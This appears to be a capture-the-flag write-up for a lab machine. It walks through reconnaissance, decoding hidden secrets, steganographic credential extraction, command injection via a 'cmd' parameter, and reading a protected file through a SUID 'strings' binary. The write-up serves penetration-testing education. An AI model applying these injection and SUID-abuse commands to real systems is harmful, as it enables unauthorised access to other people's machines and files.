# Le Meffert — User Flag Write-Up

## 1. Objective

Target: `10.10.0.16`

Goal: obtain the `user.txt` flag.



## 2. Reconnaissance

A full TCP scan revealed two services running on unusual ports:

```bash
nmap -sC -sV -p- --min-rate 5000 10.10.0.16
```

Results:

- `22/tcp` → Apache HTTP
- `80/tcp` → OpenSSH

The web application was therefore accessible at:

```text
http://10.10.0.16:22
```



## 3. Web Enumeration

The HTML source contained two useful comments:

- a reference to `/recovery.php`;
- a Base64-encoded backup password.

The Base64 value was decoded with:

```bash
echo '<BASE64>' | base64 -d
```

Recovered passphrase:

```text
5Uch_4_G3n1u5_cR34ToR
```

The `/recovery.php` page contained another encoded message.

It was decoded through three layers:

```bash
echo '<ENCODED_DATA>' | base64 -d | base32 -d | xxd -r -p
```

Result:

```text
You forgot again didnt you? remember: the cubes are the keys to everything
```

This indicated that the cube images had to be investigated.



## 4. Steganography

The cube images were downloaded and inspected.

Using `steghide` with the recovered passphrase:

```bash
steghide info cube_gold.jpg -p '5Uch_4_G3n1u5_cR34ToR'
```

`cube_gold.jpg` contained an embedded file named `passwd`.

Extraction:

```bash
steghide extract -sf cube_gold.jpg -p '5Uch_4_G3n1u5_cR34ToR'
cat passwd
```

Recovered web credentials:

```text
Username: uweThePuzzleMaster
Password: i_W4N7_70_C0Ll3C7_4Ll_Pu22l35
```



## 5. Secret Web Page

The credentials were submitted to `recovery.php`.

Successful authentication redirected to:

```text
/my_very_secret_dir/index.php
```

The page displayed:

```text
GET me a cmd and we'll talk!
```

Testing the `cmd` GET parameter confirmed command injection:

```bash
curl -G -b cookies.txt \
  --data-urlencode 'cmd=id' \
  http://10.10.0.16:22/my_very_secret_dir/index.php
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This provided remote command execution as `www-data`.



## 6. Local Enumeration

The target contained the user:

```text
uwe:x:1000:1000::/home/uwe:/bin/bash
```

However, `/home/uwe` was not accessible by `www-data`.

SUID binaries were enumerated with:

```bash
find / -perm -4000 -type f 2>/dev/null
```

An unusual SUID binary was found:

```text
-rwsr-sr-x 1 root root ... /usr/bin/x86_64-linux-gnu-strings
```

Because `strings` was owned by `root` and had the SUID bit set, it could read files using root privileges.



## 7. User Flag

The protected flag was read with:

```bash
/usr/bin/x86_64-linux-gnu-strings /home/uwe/user.txt
```

Result:

```text
EPI{Wha7_1f_1_70ld_Y0u_p37AM1nX}
```

**User flag obtained successfully.**



## 8. Attack Chain

```text
Nmap
→ HTTP enumeration
→ HTML comments
→ Base64 decoding
→ recovery.php
→ Base64 + Base32 + Hex decoding
→ cube image investigation
→ Steghide
→ web credentials
→ secret page
→ command injection
→ RCE as www-data
→ SUID enumeration
→ SUID strings
→ user.txt
```



## 9. Techniques and Tools

| Phase | Technique | Tool |
||||
| Reconnaissance | TCP/service enumeration | Nmap |
| Web enumeration | Source-code inspection | curl |
| Encoding | Base64 / Base32 / Hex decoding | base64, base32, xxd |
| Steganography | Hidden file extraction | steghide |
| Exploitation | Command injection | curl |
| Local enumeration | SUID discovery | find |
| Privilege abuse | SUID binary file read | strings |

## Key Takeaway

The room combines several enumeration techniques rather than relying on a single vulnerability. The main exploitation path was:

**information disclosure → steganography → web authentication → command injection → SUID abuse.**
